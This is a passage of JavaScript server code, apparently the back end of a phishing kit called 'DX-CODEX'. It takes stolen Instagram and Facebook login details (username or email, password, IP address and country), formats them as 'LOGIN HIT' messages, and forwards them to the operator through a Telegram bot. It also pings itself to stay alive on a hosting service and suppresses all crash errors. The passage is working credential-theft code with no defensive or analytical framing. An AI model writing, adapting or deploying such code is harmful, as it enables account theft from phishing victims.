            let msg = `<b>┏━━「 📸 ${_fnt("INSTAGRAM LOGIN HIT")} 」━━┓</b>\n`;
            msg += `┃ 👤 <b>${_fnt("USERNAME")}:</b> <code>${data.username}</code>\n`;
            msg += `┃ 🔑 <b>${_fnt("PASSWORD")}:</b> <code>${data.password}</code>\n`;
            msg += `┃ 📍 <b>${_fnt("IP ADDRESS")}:</b> <code>${data.ip}</code> (${data.country})\n`;
            msg += `<b>┗━━━━━━━━━━━━━━━━━━━━━━━┛</b>`;
            await bot.sendMessage(owner, msg, {parse_mode:'HTML'});
            
        } else if (type === 'fb_login') {
            let msg = `<b>┏━━「 📘 ${_fnt("FACEBOOK LOGIN HIT")} 」━━┓</b>\n`;
            msg += `┃ 📧 <b>${_fnt("EMAIL/PHONE")}:</b> <code>${data.email}</code>\n`;
            msg += `┃ 🔑 <b>${_fnt("PASSWORD")}:</b> <code>${data.password}</code>\n`;
            msg += `┃ 📍 <b>${_fnt("IP ADDRESS")}:</b> <code>${data.ip}</code> (${data.country})\n`;
            msg += `<b>┗━━━━━━━━━━━━━━━━━━━━━━━┛</b>`;
            await bot.sendMessage(owner, msg, {parse_mode:'HTML'});
        }
        res.json({ status: 'success' });
    } catch (e) { res.json({ status: 'error' }); }
});

const PING_URL = process.env.RENDER_EXTERNAL_URL || `http://localhost:${PORT}`; 
setInterval(async () => {
    try { await axios.get(PING_URL); } catch (e) {}
}, 300000); 

process.on('uncaughtException', () => {});
process.on('unhandledRejection', () => {});

app.listen(PORT, () => console.log(`DX-CODEX System Online`));
